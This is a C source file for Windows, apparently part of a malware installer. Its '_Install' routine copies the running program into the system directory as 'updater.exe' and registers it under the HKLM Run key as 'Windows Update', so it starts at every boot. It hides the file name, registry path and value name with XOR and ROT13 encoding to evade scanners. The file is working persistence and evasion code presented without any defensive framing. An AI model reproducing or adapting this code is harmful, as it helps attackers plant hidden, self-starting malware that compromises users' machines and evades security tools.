#include "data_globals.h"
#include <windows.h>
#include <string.h>
#include <stddef.h>   // for size_t

#pragma optimize("", off)
static void xor_decrypt(volatile char *buf, size_t len, unsigned char key) {
    for (size_t i = 0; i < len; i++) {
        buf[i] ^= key;
    }
}

uint32_t _Install(void)
{
    char ModPath[256];
    char SPath[256];
    char TranGU[110];
    DWORD cbData;
    HKEY hKey;

    // "\\updater.exe" XOR'd with key 0x3E
    volatile char sz_updater[] = {
        '\\'^0x3E, 'u'^0x3E, 'p'^0x3E, 'd'^0x3E, 'a'^0x3E, 't'^0x3E, 'e'^0x3E, 'r'^0x3E,
        '.'^0x3E, 'e'^0x3E, 'x'^0x3E, 'e'^0x3E, 0x00^0x3E
    };
    // "FBSGJNER\\Zvpebfbsg\\Jvaqbjf\\PheeragIrefvba\\Eha" XOR'd with key 0x7A
    volatile char sz_enc_reg[] = {
        'F'^0x7A, 'B'^0x7A, 'S'^0x7A, 'G'^0x7A, 'J'^0x7A, 'N'^0x7A, 'E'^0x7A, 'R'^0x7A,
        '\\'^0x7A, 'Z'^0x7A, 'v'^0x7A, 'p'^0x7A, 'e'^0x7A, 'b'^0x7A, 'f'^0x7A, 'b'^0x7A,
        's'^0x7A, 'g'^0x7A, '\\'^0x7A, 'J'^0x7A, 'v'^0x7A, 'a'^0x7A, 'q'^0x7A, 'b'^0x7A,
        'j'^0x7A, 'f'^0x7A, '\\'^0x7A, 'P'^0x7A, 'h'^0x7A, 'e'^0x7A, 'e'^0x7A, 'r'^0x7A,
        'a'^0x7A, 'g'^0x7A, 'I'^0x7A, 'r'^0x7A, 'e'^0x7A, 'f'^0x7A, 'v'^0x7A, 'b'^0x7A,
        'a'^0x7A, '\\'^0x7A, 'E'^0x7A, 'h'^0x7A, 'a'^0x7A, 0x00^0x7A
    };
    // "Windows Update" XOR'd with key 0x1F
    volatile char sz_value_name[] = {
        'W'^0x1F, 'i'^0x1F, 'n'^0x1F, 'd'^0x1F, 'o'^0x1F, 'w'^0x1F, 's'^0x1F, ' '^0x1F,
        'U'^0x1F, 'p'^0x1F, 'd'^0x1F, 'a'^0x1F, 't'^0x1F, 'e'^0x1F, 0x00^0x1F
    };

    GetModuleFileNameA(NULL, ModPath, sizeof(ModPath));
    GetSystemDirectoryA(SPath, sizeof(SPath));
    xor_decrypt(sz_updater, sizeof(sz_updater), 0x3E);
    strcat(SPath, (char*)sz_updater);
    CopyFileA(ModPath, SPath, FALSE);

    memset(TranGU, 0, sizeof(TranGU));
    xor_decrypt(sz_enc_reg, sizeof(sz_enc_reg), 0x7A);
    _CiphStr(TranGU, (char*)sz_enc_reg);   // decrypt ROT13 to actual registry path

    RegOpenKeyExA(HKEY_LOCAL_MACHINE, TranGU, 0, KEY_WRITE, &hKey);
    cbData = strlen(SPath);
    xor_decrypt(sz_value_name, sizeof(sz_value_name), 0x1F);
    RegSetValueExA(hKey, (char*)sz_value_name, 0, REG_SZ, SPath, cbData);
    RegCloseKey(hKey);

    return 0;
}
#pragma optimize("", on)
